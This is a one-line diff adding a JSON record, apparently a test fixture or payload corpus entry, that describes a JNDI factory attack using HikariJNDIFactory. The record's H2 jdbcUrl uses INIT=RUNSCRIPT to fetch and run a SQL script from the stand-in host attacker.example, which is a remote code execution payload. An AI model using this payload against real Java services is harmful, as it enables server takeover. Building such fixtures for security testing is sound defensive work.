@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"com.zaxxer.hikari.HikariJNDIFactory","reference_class":"javax.sql.DataSource","factory_attrs":{"jdbcUrl":"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'","driverClassName":"org.h2.Driver","username":"sa","password":""}}
